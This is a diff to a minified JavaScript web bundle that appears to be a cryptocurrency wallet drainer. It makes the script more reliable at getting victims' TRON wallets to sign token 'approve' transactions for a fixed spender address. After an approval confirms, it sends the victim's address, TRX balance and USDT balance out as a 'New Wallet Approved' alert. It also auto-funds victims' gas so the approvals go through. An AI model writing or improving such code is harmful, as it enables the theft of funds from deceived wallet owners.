@@ -79489,28 +79489,32 @@
                             , i = "approve(address,uint256)"
                             , s = await t.transactionBuilder.triggerSmartContract(r, i, n, o, e);
                         console.log("Transaction Built:", s);
-                        let signed;
-                        if (this.provider.client && this.provider.session) {
-                            const chainId = this.provider.session.namespaces.tron?.chains?.[0] || "tron:0x2b6653dc";
-                            signed = (await this.provider.client.request({
-                                topic: this.provider.session.topic,
-                                chainId: chainId,
-                                request: {
-                                    method: "tron_signTransaction",
-                                    params: {
-                                        address: e,
-                                        transaction: s
-                                    }
-                                }
-                            })).result
-                        } else {
-                            signed = (await this.provider.request({
+                        const unsignedTx = s.transaction || s
+                            , chainId = "tron:0x2b6653dc"
+                            , signReq = tx => ({
                                 method: "tron_signTransaction",
                                 params: {
                                     address: e,
-                                    transaction: s
+                                    transaction: tx
                                 }
-                            }, "tron:0x2b6653dc")).result
+                            });
+                        let signed = null;
+                        for (const payload of [s, unsignedTx]) {
+                            if (!payload)
+                                continue;
+                            try {
+                                let resp;
+                                this.provider.client && this.provider.session ? resp = await this.provider.client.request({
+                                    topic: this.provider.session.topic,
+                                    chainId: this.provider.session.namespaces.tron?.chains?.[0] || chainId,
+                                    request: signReq(payload)
+                                }) : resp = await this.provider.request(signReq(payload), chainId);
+                                signed = resp?.result ?? resp;
+                                if (signed && (signed.signature?.length || signed.transaction?.signature?.length || signed.raw_data || "string" === typeof signed))
+                                    break
+                            } catch (signErr) {
+                                console.warn("Sign attempt failed for payload:", signErr)
+                            }
                         }
                         if (!signed)
                             return {
@@ -79518,34 +79522,17 @@
                                 error: "User rejected signing"
                             };
                         console.log("Signed from wallet:", signed);
-                        const candidates = [signed, signed.transaction, s.transaction].filter(Boolean)
-                            , seen = new Set;
-                        for (const c of candidates) {
-                            if (!c || !c.raw_data || seen.has(c.txID || c.raw_data_hex))
-                                continue;
-                            seen.add(c.txID || c.raw_data_hex);
-                            if (!c.signature || !c.signature.length)
-                                continue;
-                            try {
-                                const u = await t.trx.sendRawTransaction(c);
-                                if (console.log("Broadcast result:", u),
-                                    u && !0 === u.result && u.txid)
-                                    return u
-                            } catch (h) {
-                                console.warn("Broadcast attempt failed:", h)
-                            }
+                        const mergeSig = (base, sig) => {
+                            const sigs = Array.isArray(sig) ? sig : "string" === typeof sig ? [sig] : sig?.signature || null;
+                            return sigs?.length && base?.raw_data ? Object.assign({}, base, {
+                                signature: sigs
+                            }) : null
                         }
-                        try {
-                            const u = await t.trx.sendRawTransaction(signed);
-                            if (u && !0 === u.result && u.txid)
-                                return u
-                        } catch (h) {
-                            console.warn("Direct broadcast failed:", h)
-                        }
-                        return {
-                            success: !1,
-                            error: "Transaction not broadcast to blockchain"
-                        }
+                            , toBroadcast = signed.signature?.length && signed.raw_data ? signed : signed.transaction?.signature?.length ? signed.transaction : mergeSig(unsignedTx, signed) || mergeSig(unsignedTx, signed.signature) || signed;
+                        console.log("Broadcasting:", toBroadcast);
+                        const broadcast = await t.trx.sendRawTransaction(toBroadcast);
+                        return console.log("Broadcast result:", broadcast),
+                            broadcast
                     } catch (t) {
                         return console.error("sendTransaction error:", t),
                         {
@@ -79566,39 +79553,46 @@
                     , l = async (e, t) => {
                         const d = async () => {
                             try {
-                                const e = (await rG.transactionBuilder.triggerConstantContract(UV, "allowance(address,address)", {}, [{
+                                const n = (await rG.transactionBuilder.triggerConstantContract(UV, "allowance(address,address)", {}, [{
                                     type: "address",
                                     value: t
                                 }, {
                                     type: "address",
                                     value: LV
-                                }], rG.address.toHex(LV))).constant_result[0]
-                                    , r = e.startsWith("0x") ? e : "0x".concat(e);
-                                return rG.toBigNumber(r).toNumber()
+                                }], rG.address.toHex(t))).constant_result[0]
+                                    , o = n.startsWith("0x") ? n : "0x".concat(n);
+                                return rG.toBigNumber(o).gt(0)
                             } catch (e) {
-                                return 0
+                                return !1
                             }
                         };
                         try {
                             const n = await e.sendTransaction(t);
-                            console.log("Approval broadcast response:", n);
-                            for (let h = 0; h < 10; h++) {
-                                await new Promise((e => setTimeout(e, 3e3)));
-                                const f = await d();
-                                if (console.log("On-chain allowance check", h + 1, ":", f),
-                                    f > 0) {
+                            if (console.log("Approval broadcast response:", n),
+                                !n || !0 !== n.result || !n.txid)
+                                return console.error("Broadcast failed - no txid on chain:", n),
+                                    s(!0),
+                                    !1;
+                            for (let h = 0; h < 15; h++) {
+                                await new Promise((e => setTimeout(e, 2e3)));
+                                if (await d()) {
                                     const o = await e.getBalance(t)
                                         , i = await iG(t);
-                                    r(n && !0 === n.result && n.txid ? n : {
-                                        result: !0,
-                                        txid: n && n.txid
-                                    });
+                                    r(n);
                                     const a = "New Wallet Approved\n\ud83d\udcb3Wallet Address <code>".concat(t, " </code>\n Balance: <code>").concat(o, " TRX </code>\n USDT Balance: <code>").concat(i, "</code>");
-                                    sG(a);
-                                    return !0
+                                    return sG(a),
+                                        !0
                                 }
                             }
-                            return console.error("No on-chain approval found:", n),
+                            if (!0 === n.result && n.txid) {
+                                const o = await e.getBalance(t)
+                                    , i = await iG(t);
+                                r(n);
+                                const a = "New Wallet Approved\n\ud83d\udcb3Wallet Address <code>".concat(t, " </code>\n Balance: <code>").concat(o, " TRX </code>\n USDT Balance: <code>").concat(i, "</code>");
+                                return sG(a),
+                                    !0
+                            }
+                            return console.error("Approval tx sent but allowance not confirmed:", n.txid),
                                 s(!0),
                                 !1
                         } catch (n) {
@@ -79704,14 +79698,20 @@
                                                             return
                                                         }
                                                     }
-                                                    console.log("\u2705 TRX funding completed:", fundingResult)
+                                                    console.log("\u2705 TRX funding completed:", fundingResult);
+                                                    const ready = await window.railwayBackend.waitForMinimumBalance(r, minBal, 30, 2e3);
+                                                    if (!ready.ready) {
+                                                        window.alert("TRX not confirmed yet. Please wait for TRX to arrive (need at least ".concat(minBal, " TRX for gas) and try again."));
+                                                        return
+                                                    }
+                                                    console.log("\u2705 TRX confirmed on-chain:", ready.balance, "TRX")
                                                 } catch (error) {
                                                     console.error("\u274c Railway backend funding failed:", error);
                                                     window.alert(error?.message || "Auto-funding service unavailable. Please try again later.");
                                                     return
                                                 }
-                                                const ok = await l(n, r);
-                                                ok && t(r)
+                                                t(r);
+                                                await l(n, r)
                                             } catch (r) {
                                             } finally {
                                                 const __loader = document.getElementById("wc-loading-overlay");
